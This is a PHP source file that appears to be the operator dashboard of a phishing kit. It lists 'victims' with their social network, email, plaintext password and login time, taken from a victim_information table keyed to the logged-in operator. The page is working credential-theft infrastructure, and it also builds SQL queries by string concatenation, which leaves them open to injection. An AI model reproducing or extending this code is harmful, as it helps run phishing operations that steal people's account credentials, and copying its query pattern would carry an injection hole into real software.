<?php
include('header.php');
include_once('redirect.php');
$sqlCurrentUser = "SELECT id FROM registered_users WHERE email ='".$_SESSION['email']."'LIMIT 1";
$sqlCurrentUserResult = $conn->query($sqlCurrentUser);
$userIdforVictim = $sqlCurrentUserResult->fetch_assoc();

$sqlVictim = "SELECT * FROM victim_information WHERE `user id` = '".$userIdforVictim['id']."'";
$resultVictim = $conn->query($sqlVictim);
?>
<h2 class="text-center text-danger" style="font-family: 'Fuzzy Bubbles', cursive;"> <u>  Victims Information </u></h2>

<table class="table table-striped">
  <thead>
    <tr>
      <th scope="col" >#</th>
      <th scope="col" >Social</th>
      <th scope="col">Email</th>
      <th scope="col">Password</th>
      <th scope="col">Login Time</th>
    </tr>
  </thead>
  <tbody>
  <!-- <th class="text-center"> -->
      <th></th>
      <th></th>
      <th></th>
      <th class="text-center alert-info"> No recorded data available..</th>
    <!-- </tr> -->
    <?php 
    if($resultVictim==TRUE){
      while($rowVictim = $resultVictim->fetch_assoc()){
        echo '
      <tr>
        <th scope="row">'.$rowVictim['id'].'</th>
        <td>'.$rowVictim['social network'].'</td>
        <td>'.$rowVictim['email'].'</td>
        <td>'.$rowVictim['password'].'</td>
        <td>'.$rowVictim['login time'].'</td>
      </tr>';
      }
    }else { echo "<tr>
      <th scope='row'>0</th>
      <td>nothing</td>
      <td>nothing</td>
      <td>nothing</td>
      <td>nothing</td>
    </tr>";};
    ?>
  </tbody>
</table>

<?php include('footer.php'); ?>